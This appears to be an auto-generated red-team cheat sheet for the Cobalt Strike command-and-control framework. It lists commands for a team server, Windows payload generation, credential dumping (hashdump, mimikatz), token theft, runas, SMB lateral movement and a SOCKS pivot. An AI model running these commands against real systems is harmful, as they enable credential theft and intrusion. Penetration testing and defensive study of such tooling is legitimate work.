# Red Team Tools

_1 tool command_

### Cobalt Strike  `cobaltstrike-tool`
_Red team penetration testing framework_

**Step 0**
> Start the team server
_platform: linux_
```
./teamserver ip password [C2_profile]
```

**Step 0**
> Generate an executable payload
```
Attacks -> Packages -> Windows Executable
```

**Step 0**
> Add a listener
```
Cobalt Strike -> Listeners -> Add
```

**Step 0**
> Common Beacon commands
```
shell whoami
ps
hashdump
mimikatz
```

**Step 0**
> SMB Beacon lateral movement
_platform: windows_
```
beacon> link target_ip
```

**Step 0**
> Start a SOCKS proxy
_platform: windows_
```
beacon> socks 1080
```

**Step 0**
> Steal a process token
_platform: windows_
```
beacon> steal_token PID
```

**Step 0**
> Run as another user
_platform: windows_
```
beacon> runas domain\user password command
```

---
